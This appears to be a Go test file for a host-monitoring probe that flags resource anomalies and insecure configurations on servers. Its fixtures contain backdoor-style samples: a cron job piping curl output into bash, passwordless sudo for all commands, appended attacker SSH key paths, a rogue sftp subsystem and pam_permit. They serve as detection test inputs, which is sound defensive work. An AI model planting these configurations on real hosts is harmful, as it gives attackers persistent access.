package probe

import (
	"strings"
	"testing"
	"time"
)

func hostMetric(host string, cpuPct float64, memAvail, diskRoot, zombie float64, svcFailed bool) HostMetric {
	hm := HostMetric{
		Host:    host,
		Metrics: map[string]map[string]float64{},
	}
	if cpuPct >= 0 {
		hm.CPU = &CPUInfo{Pct: cpuPct, Load1: 0.1, NProc: 8}
	}
	hm.Metrics["mem"] = map[string]float64{"avail_pct": memAvail}
	hm.Metrics["disk"] = map[string]float64{"/": diskRoot}
	hm.Metrics["zombie"] = map[string]float64{"count": zombie}
	if svcFailed {
		hm.Metrics["svc_failed"] = map[string]float64{"count": 1}
	}
	return hm
}

func TestJudge_ThresholdHit(t *testing.T) {
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 95, 30, 40, 0, false), // CPU crit
		hostMetric("db-01", 10, 4, 90, 0, false),   // mem crit + disk warn
	}}
	got := Judge(snap, DefaultThresholds())
	if len(got) != 3 {
		t.Fatalf("anomalies = %d, want 3（cpu crit, mem crit, disk warn）: %+v", len(got), got)
	}
	bySignal := map[string]Severity{}
	for _, a := range got {
		bySignal[a.Signal()] = a.Severity
	}
	if bySignal["cpu_high"] != SevCrit {
		t.Errorf("cpu_high severity = %s, want critical", bySignal["cpu_high"])
	}
	if bySignal["mem_low"] != SevCrit {
		t.Errorf("mem_low severity = %s, want critical", bySignal["mem_low"])
	}
	if bySignal["disk_high"] != SevWarn {
		t.Errorf("disk_high severity = %s, want warn", bySignal["disk_high"])
	}
}

func TestJudge_Healthy(t *testing.T) {
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 10, 60, 40, 0, false),
		hostMetric("db-01", 8, 55, 35, 0, false),
	}}
	if got := Judge(snap, DefaultThresholds()); len(got) != 0 {
		t.Errorf("健康环境不应有异常: %+v", got)
	}
}

func TestJudge_SvcFailedAndZombie(t *testing.T) {
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 5, 50, 30, 7, true),
	}}
	got := Judge(snap, DefaultThresholds())
	signals := map[string]Severity{}
	for _, a := range got {
		signals[a.Signal()] = a.Severity
	}
	if signals["zombie_procs"] != SevCrit {
		t.Errorf("zombie severity = %s, want critical", signals["zombie_procs"])
	}
	if signals["svc_failed"] != SevWarn {
		t.Errorf("svc_failed severity = %s, want warn", signals["svc_failed"])
	}
}

// TestJudge_NewProbes 新增确定性探针的判定（进程/内核/网络/交换/已删
// 二进制）：数据驱动，有对应数据段即判定，无数据段静默跳过。
func TestJudge_NewProbes(t *testing.T) {
	hm := hostMetric("web-01", 5, 50, 30, 0, false)
	hm.Metrics["proc_top"] = map[string]float64{"1234(miner)": 152}
	hm.Metrics["kernel_events"] = map[string]float64{"count": 3}
	hm.Metrics["net_if_errors"] = map[string]float64{"eth0": 4, "eth1": 7}
	hm.Metrics["swap"] = map[string]float64{"swap_pct": 82}
	hm.Metrics["proc_deleted"] = map[string]float64{"count": 2}
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{hm}}
	signals := map[string]Severity{}
	for _, a := range Judge(snap, DefaultThresholds()) {
		signals[a.Signal()] = a.Severity
	}
	for sig, want := range map[string]Severity{
		"proc_top_cpu":     SevCrit, // 152 ≥ crit 150
		"kernel_events":    SevWarn, // 3 条：warn 区间
		"net_if_errors":    SevWarn, // 4/7 均超 warn
		"swap_high":        SevCrit, // 82 ≥ crit 80
		"proc_deleted_bin": SevWarn,
	} {
		if signals[sig] != want {
			t.Errorf("%s = %s, want %s（全部: %v）", sig, signals[sig], want, signals)
		}
	}
}

// TestJudge_ExpandProbes L0 覆盖扩展（轻/快/广）的判定：D 状态进程
// （IO/NFS 挂死）与 fd 使用率（fd 耗尽）——对象级/聚合级阈值判定，
// 数据驱动，无数据段静默跳过。
func TestJudge_ExpandProbes(t *testing.T) {
	hm := hostMetric("web-01", 5, 50, 30, 0, false)
	hm.Metrics["proc_dstate"] = map[string]float64{"200(nfsd)": 1, "201(nfsd)": 1}
	hm.Metrics["file_desc"] = map[string]float64{"fd_pct": 82}
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{hm}}
	signals := map[string]Severity{}
	for _, a := range Judge(snap, DefaultThresholds()) {
		signals[a.Signal()] = a.Severity
	}
	if signals["dstate_procs"] != SevWarn {
		t.Errorf("dstate_procs = %s, want warn（2 个 D 状态 ≥ warn 1）: %v", signals["dstate_procs"], signals)
	}
	if signals["fd_high"] != SevWarn {
		t.Errorf("fd_high = %s, want warn（82%% 使用率 ≥ 80 阈值）: %v", signals["fd_high"], signals)
	}
	// 健康值不产线：1 个 D 状态以下/低 fd 使用率。
	hm2 := hostMetric("web-01", 5, 50, 30, 0, false)
	hm2.Metrics["proc_dstate"] = map[string]float64{}
	hm2.Metrics["file_desc"] = map[string]float64{"fd_pct": 30}
	if got := Judge(&Snapshot{At: time.Now(), Hosts: []HostMetric{hm2}}, DefaultThresholds()); len(got) != 0 {
		t.Errorf("健康环境不应产线: %+v", got)
	}
}

func TestJudge_LogErrors(t *testing.T) {
	// 日志错误探针：最近 10 分钟有错误日志即产 warn 线索（模型漏看日志的
	// 确定性兜底），20 条+ 为 crit（错误风暴）。
	hm := hostMetric("web-01", 5, 50, 30, 0, false)
	hm.Metrics["log_errors"] = map[string]float64{"count": 3}
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{hm}}
	got := Judge(snap, DefaultThresholds())
	if len(got) != 1 || got[0].Signal() != "log_errors" || got[0].Severity != SevWarn {
		t.Errorf("log_errors 应产 warn 线索: %+v", got)
	}
	hm.Metrics["log_errors"] = map[string]float64{"count": 25}
	got = Judge(snap, DefaultThresholds())
	if len(got) != 1 || got[0].Severity != SevCrit {
		t.Errorf("错误风暴应产 crit: %+v", got)
	}
}

func TestJudge_SecurityProbes(t *testing.T) {
	// Security 兜底探针：检出即产 warn 线索（DeepDive 验证回路裁决）。
	hm := hostMetric("web-01", 5, 50, 30, 0, false)
	hm.Metrics["suid_files"] = map[string]float64{"count": 3}
	hm.Metrics["world_writable"] = map[string]float64{"count": 1}
	hm.Metrics["ssh_root_login"] = map[string]float64{"count": 1}
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{hm}}
	got := Judge(snap, DefaultThresholds())
	signals := map[string]Severity{}
	for _, a := range got {
		signals[a.Signal()] = a.Severity
	}
	for signal, want := range map[string]Severity{
		"suid_files": SevWarn, "world_writable": SevWarn,
		// SSH root 直登是确定的弱配置（CIS 2.2.2），命中即 crit；
		// 数量型探针只产 warn 线索，严重度由 DeepDive 验证回路裁决。
		"ssh_root_login": SevCrit,
	} {
		if signals[signal] != want {
			t.Errorf("%s severity = %s, want %s", signal, signals[signal], want)
		}
	}
}

func TestJudge_CrossHostDeviation(t *testing.T) {
	// MAD 离群（Hampel 规则）：3 台 cpu 5/10/70 → med=10, mad=1.4826×5,
	// fence=28.5；70 超 fence 且 ≥ warn×0.5（40）→ 横向告警。
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 5, 50, 40, 0, false),
		hostMetric("web-02", 10, 52, 42, 0, false),
		hostMetric("web-03", 70, 50, 41, 0, false),
	}}
	got := Judge(snap, DefaultThresholds())
	found := false
	for _, a := range got {
		if a.Host == "web-03" && a.Metric == "cpu" && a.Severity == SevWarn {
			found = true
		}
	}
	if !found {
		t.Errorf("web-03 应被 MAD 离群检测检出 cpu 异常: %+v", got)
	}
}

func TestJudge_SuidFactsOutsideStandardDirs(t *testing.T) {
	// SUID 事实（常规 L0 采集）：标准二进制目录外的 SUID 是异常提权载体
	// （R22 实测 /var/lib/.find 隐藏 SUID 漏检——此前 SUID 只在模型失败
	// 兜底采集）；标准目录内（passwd/su 等发行版默认）不产线免噪音。
	hm := hostMetric("web-01", 5, 50, 30, 0, false)
	hm.Raw = map[string]string{
		"suid_files": "/usr/bin/passwd\n/usr/bin/su\n/var/lib/.find\n",
	}
	got := JudgeSecurityFacts(&hm)
	var found *Anomaly
	for i := range got {
		if got[i].Metric == "suid_files" && got[i].Key == "/var/lib/.find" {
			found = &got[i]
		}
		if got[i].Metric == "suid_files" && (got[i].Key == "/usr/bin/passwd" || got[i].Key == "/usr/bin/su") {
			t.Errorf("标准目录 SUID %s 不应产线: %+v", got[i].Key, got[i])
		}
	}
	if found == nil {
		t.Fatalf("标准目录外 SUID 应产 suid_files 线索: %+v", got)
	}
}

func TestJudge_MountsBindAnnotated(t *testing.T) {
	// bind 挂载掩盖（/tmp → /var/log）：线索必须标注 bind 关系（源是挂载点
	// 路径），否则模型把 rm -rf /var/log/evil 当独立处置，实际误删源挂载点
	// 内容（R22 实测 M3 处置误删 /tmp/evil 致 LD_PRELOAD 链路断裂）。
	hm := hostMetric("web-01", 5, 50, 30, 0, false)
	hm.Raw = map[string]string{
		"mounts": "tmpfs /run tmpfs\n/tmp /var/log tmpfs\n/dev/mapper/root / ext4\n",
	}
	got := JudgeSecurityFacts(&hm)
	var found *Anomaly
	for i := range got {
		if got[i].Metric == "mounts" && got[i].Key == "/var/log" {
			found = &got[i]
		}
	}
	if found == nil {
		t.Fatalf("被掩盖目录应产 mounts 线索: %+v", got)
	}
	if !strings.Contains(found.Desc, "/tmp") || !strings.Contains(found.Desc, "bind") {
		t.Errorf("bind 掩盖线索应标注源挂载点与 bind 关系: %q", found.Desc)
	}
}

func TestJudge_CrossHost_Disk(t *testing.T) {
	// 磁盘根分区同样参与横向检测：3 台 5/10/70 → 70 超 fence 且 ≥ 85×0.5。
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 5, 50, 5, 0, false),
		hostMetric("web-02", 5, 50, 10, 0, false),
		hostMetric("web-03", 5, 50, 70, 0, false),
	}}
	got := Judge(snap, DefaultThresholds())
	found := false
	for _, a := range got {
		if a.Host == "web-03" && a.Metric == "disk" {
			found = true
		}
	}
	if !found {
		t.Errorf("web-03 应被检出磁盘横向异常: %+v", got)
	}
}

func TestJudge_CrossHost_TooFewHosts(t *testing.T) {
	// 2 台主机无法定义集群中心（MAD 最小可用样本为 3），不产横向告警。
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 5, 50, 40, 0, false),
		hostMetric("web-02", 70, 50, 41, 0, false),
	}}
	for _, a := range Judge(snap, DefaultThresholds()) {
		if a.Metric == "cpu" && a.Value == 70 {
			t.Errorf("2 台主机不应有横向告警: %+v", a)
		}
	}
}

func TestJudge_CrossHost_MagnitudeFloor(t *testing.T) {
	// 统计离群但绝对值低于最小关注幅度（warn×0.5=40）：
	// 1/2/8 中 8 超 fence=5.7，但 8 < 40 → 不报（低水位噪声护栏）。
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 1, 50, 40, 0, false),
		hostMetric("web-02", 2, 50, 41, 0, false),
		hostMetric("web-03", 8, 50, 42, 0, false),
	}}
	for _, a := range Judge(snap, DefaultThresholds()) {
		if a.Metric == "cpu" {
			t.Errorf("低于关注幅度的离群不应报: %+v", a)
		}
	}
}

func TestJudge_CrossHost_MadZero(t *testing.T) {
	// MAD=0（其余主机值完全一致）：fence 退化到中位数，由最小关注幅度
	// 护栏兜底——10/10/70 中 70 > 10 且 ≥ 40 → 检出。
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{
		hostMetric("web-01", 10, 50, 40, 0, false),
		hostMetric("web-02", 10, 50, 41, 0, false),
		hostMetric("web-03", 70, 50, 42, 0, false),
	}}
	found := false
	for _, a := range Judge(snap, DefaultThresholds()) {
		if a.Host == "web-03" && a.Metric == "cpu" {
			found = true
		}
	}
	if !found {
		t.Errorf("MAD=0 时偏离集群一致值且达关注幅度应检出: %+v", Judge(snap, DefaultThresholds()))
	}
}

func TestJudge_CollectErrorIsAnomaly(t *testing.T) {
	hm := hostMetric("db-01", -1, 50, 30, 0, false)
	hm.Errors = map[string]string{"collect": "ssh: connection refused"}
	snap := &Snapshot{At: time.Now(), Hosts: []HostMetric{hm}}
	got := Judge(snap, DefaultThresholds())
	if len(got) != 1 || got[0].Metric != "collect" {
		t.Errorf("采集失败应产生 collect 异常: %+v", got)
	}
}

func TestAnomalySignal(t *testing.T) {
	cases := map[string]string{
		"cpu": "cpu_high", "mem": "mem_low", "disk": "disk_high",
		"inode": "inode_high", "zombie": "zombie_procs", "svc_failed": "svc_failed",
	}
	for metric, want := range cases {
		if got := (Anomaly{Metric: metric}).Signal(); got != want {
			t.Errorf("Signal(%s) = %s, want %s", metric, got, want)
		}
	}
}

// TestSSHWeakViolation SSH 配置弱化基线（CIS 2.2 系列）：有效行偏离
// 硬基线即违规；默认值/合法值不产线。
func TestSSHWeakViolation(t *testing.T) {
	cases := []struct {
		line string
		want bool
	}{
		{"PermitEmptyPasswords yes", true},
		{"IgnoreRhosts no", true},
		{"PermitTunnel yes", true},
		{"PermitUserEnvironment yes", true},
		{"PrintLastLog no", true},
		{"ClientAliveCountMax 0", true},
		{"KexAlgorithms diffie-hellman-group1-sha1", true},
		{"Ciphers aes128-cbc", true},
		{"MaxAuthTries 100", true},
		{"MaxAuthTries 6", false},
		{"MaxSessions 50", true},
		{"MaxSessions 10", false},
		{"LoginGraceTime 300", true},
		{"LoginGraceTime 120", false},
		{"MaxStartups 100:30:200", true},
		{"MaxStartups 10:30:100", false},
		{"AuthorizedKeysFile /tmp/.ak", true},
		{"AuthorizedKeysFile .ssh/authorized_keys", false},
		{"Subsystem sftp /tmp/.sftp-backdoor", true},
		{"Subsystem sftp /usr/libexec/openssh/sftp-server", false},
		{"LogLevel DEBUG3", true},
		{"LogLevel INFO", false},
		{"PasswordAuthentication yes", false},
		{"X11Forwarding yes", false}, // 发行版默认，不属基线违规
		{"PermitRootLogin yes", false},
		{"GatewayPorts yes", true},
		{"GatewayPorts no", false},
	}
	for _, c := range cases {
		if _, got := sshWeakViolation(c.line); got != c.want {
			t.Errorf("sshWeakViolation(%q) = %v, want %v", c.line, got, c.want)
		}
	}
}

// TestSudoWeakViolation sudo 授权链弱化基线：万能免密与危险 Defaults。
func TestSudoWeakViolation(t *testing.T) {
	cases := []struct {
		line string
		want bool
	}{
		{"ALL ALL=(ALL) NOPASSWD: ALL", true},
		{"metrics ALL=(ALL) NOPASSWD: ALL", true},
		{"deploy ALL=(ALL) NOPASSWD: /usr/bin/rsync", false},
		{"root ALL=(ALL) ALL", false},
		{"Defaults !tty_tickets", true},
		{"Defaults !env_reset", true},
		{"Defaults env_reset", false},
		{"Defaults secure_path = /sbin:/bin:/usr/sbin:/usr/bin", false},
	}
	for _, c := range cases {
		if got := sudoWeakViolation(c.line); got != c.want {
			t.Errorf("sudoWeakViolation(%q) = %v, want %v", c.line, got, c.want)
		}
	}
}

// TestIsPublicIPv4 公网 IP 判定：私有/回环/链路本地/运营商级 NAT 均不算。
func TestIsPublicIPv4(t *testing.T) {
	pub := []string{"45.33.32.156", "8.8.8.8", "1.1.1.1", "203.0.113.5"}
	priv := []string{"127.0.0.1", "10.0.0.1", "172.16.0.1", "172.31.255.255",
		"192.168.1.1", "169.254.1.1", "100.64.0.1", "100.127.255.255",
		"0.0.0.0", "224.0.0.1", "255.255.255.255", "::1", "not-an-ip", "1.2.3"}
	for _, s := range pub {
		if !isPublicIPv4(s) {
			t.Errorf("isPublicIPv4(%q) 应为公网", s)
		}
	}
	for _, s := range priv {
		if isPublicIPv4(s) {
			t.Errorf("isPublicIPv4(%q) 不应为公网", s)
		}
	}
}

// TestJudgeSecurityFacts_AuthorizedKeysMultiPath R24 回归：AuthorizedKeysFile
// 保留默认路径再追加后门密钥文件（".ssh/authorized_keys /root/.ssh/.evil-keys"）
// 必须产线——旧规则"包含默认路径即正常"被双路径绕过，导致处置后确定性
// 复检假放行（已确认的后门配置行永久残留并收敛）。
func TestJudgeSecurityFacts_AuthorizedKeysMultiPath(t *testing.T) {
	cases := []struct {
		line string
		want bool // 是否应产线（违规）
	}{
		{"AuthorizedKeysFile .ssh/authorized_keys /root/.ssh/.evil-keys", true}, // 追加后门路径
		{"AuthorizedKeysFile /root/.ssh/authorized_keys /tmp/.evil-keys", true}, // 追加+绝对路径
		{"AuthorizedKeysFile /etc/ssh/evil-keys", true},                         // 完全替换
		{"AuthorizedKeysFile .ssh/authorized_keys2", true},                      // 替换为非常规文件
		{"AuthorizedKeysFile .ssh/authorized_keys", false},                      // 默认相对路径
		{"AuthorizedKeysFile /root/.ssh/authorized_keys", false},                // root 绝对路径等价
		{"AuthorizedKeysFile ~/.ssh/authorized_keys", false},                    // home 展开等价
	}
	for _, c := range cases {
		hm := &HostMetric{Host: "node1", Raw: map[string]string{"ssh_chain": c.line + "\n"}}
		got := JudgeSecurityFacts(hm)
		hit := len(got) > 0
		if hit != c.want {
			t.Errorf("AuthorizedKeysFile %q 产线=%v, want %v（got %+v）", c.line, hit, c.want, got)
		}
	}
}

// TestJudgeSecurityBaselineRules 安全基线归属规则集成：各新事实面的
// 原始内容按通用基线产线（任意主机/任意内容，同一机制覆盖）。
func TestJudgeSecurityBaselineRules(t *testing.T) {
	hm := &HostMetric{Host: "node1", Raw: map[string]string{
		"auth_chain":     "== /etc/pam.d/sudo\nauth sufficient pam_permit.so\n",
		"ssh_chain":      "PermitEmptyPasswords yes\nIgnoreRhosts no\n",
		"cron_chain":     "1 5 sync-check /bin/bash -c 'curl -s http://x | bash'\n",
		"sudo_chain":     "metrics ALL=(ALL) NOPASSWD: ALL\n",
		"net_identity":   "45.33.32.156 updates.svc-check.example.com\n",
		"world_writable": "/var/log/nginx\n",
	}}
	got := JudgeSecurityFacts(hm)
	sigs := map[string]bool{}
	for _, a := range got {
		sigs[a.Metric] = true
	}
	for _, want := range []string{"auth_chain", "ssh_chain", "cron_chain", "sudo_chain", "net_identity", "world_writable"} {
		if !sigs[want] {
			t.Errorf("基线归属规则未产线: %s（got %v）", want, sigs)
		}
	}
	// 无违规内容不产线（合法基线零误报）。
	clean := &HostMetric{Host: "node1", Raw: map[string]string{
		"auth_chain":   "== /etc/pam.d/sshd\nauth include system-auth\n",
		"ssh_chain":    "PasswordAuthentication yes\nAuthorizedKeysFile .ssh/authorized_keys\n",
		"cron_chain":   "01 * * * * root run-parts /etc/cron.hourly\n",
		"sudo_chain":   "root ALL=(ALL) ALL\nDefaults env_reset\n",
		"net_identity": "127.0.0.1 localhost\n172.17.0.2 abc123\n",
	}}
	if got := JudgeSecurityFacts(clean); len(got) != 0 {
		t.Errorf("合法基线不应产线: %+v", got)
	}
}

// TestJudgeEmptyPasswords 空密码账户基线（CIS）：shadow 空密码字段即
// 产线；正常账户零误报。
func TestJudgeEmptyPasswords(t *testing.T) {
	hm := &HostMetric{Host: "node1", Raw: map[string]string{
		"empty_passwords": "metrics\n",
	}}
	got := JudgeSecurityFacts(hm)
	if len(got) != 1 || got[0].Metric != "empty_passwords" || !strings.Contains(got[0].Desc, "metrics") {
		t.Fatalf("空密码账户应产线: %+v", got)
	}
	clean := &HostMetric{Host: "node1", Raw: map[string]string{"empty_passwords": ""}}
	if got := JudgeSecurityFacts(clean); len(got) != 0 {
		t.Errorf("无空密码账户不应产线: %+v", got)
	}
}

// TestJudgeSecurityFacts_ArpPermanent 网络邻接面归属规则：静态（PERMANENT）
// ARP 条目是邻接面投毒载体（正常学习条目有生命周期）——R21 实测静态
// ARP 投毒无确定性可见面。
func TestJudgeSecurityFacts_ArpPermanent(t *testing.T) {
	hm := &HostMetric{Host: "node1", Raw: map[string]string{
		"arp_neighbors": "10.0.0.1 dev eth0 lladdr 66:66:66:66:66:66 PERMANENT\n172.17.0.1 dev eth0 lladdr 02:42:ac:11:00:01 REACHABLE\n",
	}}
	got := JudgeSecurityFacts(hm)
	var hits []Anomaly
	for _, a := range got {
		if a.Metric == "arp_neighbors" {
			hits = append(hits, a)
		}
	}
	if len(hits) != 1 || hits[0].Key != "10.0.0.1" {
		t.Fatalf("静态 ARP 条目应产线（Key=10.0.0.1）: %+v", got)
	}
	if !strings.Contains(hits[0].Desc, "PERMANENT") {
		t.Errorf("描述应含 PERMANENT: %+v", hits[0])
	}
	// 纯学习条目零误报。
	clean := &HostMetric{Host: "node1", Raw: map[string]string{
		"arp_neighbors": "172.17.0.1 dev eth0 lladdr 02:42:ac:11:00:01 REACHABLE\n",
	}}
	for _, a := range JudgeSecurityFacts(clean) {
		if a.Metric == "arp_neighbors" {
			t.Errorf("学习条目不应产线: %+v", a)
		}
	}
}

// TestJudgeSecurityFacts_Watermarks 通用水位规则：vm.dirty_ratio ≥90（写
// 缓存水位）与 journald 容量 ≤2M（日志基础设施水位——事件快速丢弃）
// 产线；正常水位零误报。
func TestJudgeSecurityFacts_Watermarks(t *testing.T) {
	hm := &HostMetric{Host: "node1", Raw: map[string]string{
		"sysctl_keys":  "net.ipv4.ip_forward = 0\nvm.dirty_ratio = 95\n",
		"journald_cfg": "RuntimeMaxUse=1M\n",
	}}
	got := JudgeSecurityFacts(hm)
	count := map[string]int{}
	for _, a := range got {
		count[a.Metric]++
	}
	if count["sysctl_keys"] != 1 || count["journald_cfg"] != 1 {
		t.Fatalf("水位越线应产线: %+v", got)
	}
	clean := &HostMetric{Host: "node1", Raw: map[string]string{
		"sysctl_keys":  "net.ipv4.ip_forward = 0\nvm.dirty_ratio = 20\n",
		"journald_cfg": "RuntimeMaxUse=500M\n",
	}}
	for _, a := range JudgeSecurityFacts(clean) {
		if a.Metric == "sysctl_keys" || a.Metric == "journald_cfg" {
			t.Errorf("正常水位不应产线: %+v", a)
		}
	}
}

// TestParseSizeMB 容量后缀解析（K/M/G）。
func TestParseSizeMB(t *testing.T) {
	cases := map[string]float64{
		"1M": 1, "512K": 0.5, "2G": 2048, "1m": 1, "100": 100.0 / 1024 / 1024,
	}
	for in, want := range cases {
		got, ok := parseSizeMB(in)
		if !ok || got != want {
			t.Errorf("parseSizeMB(%q) = (%v, %v), want (%v, true)", in, got, ok, want)
		}
	}
	if _, ok := parseSizeMB("abc"); ok {
		t.Error("非法输入应返回 false")
	}
}
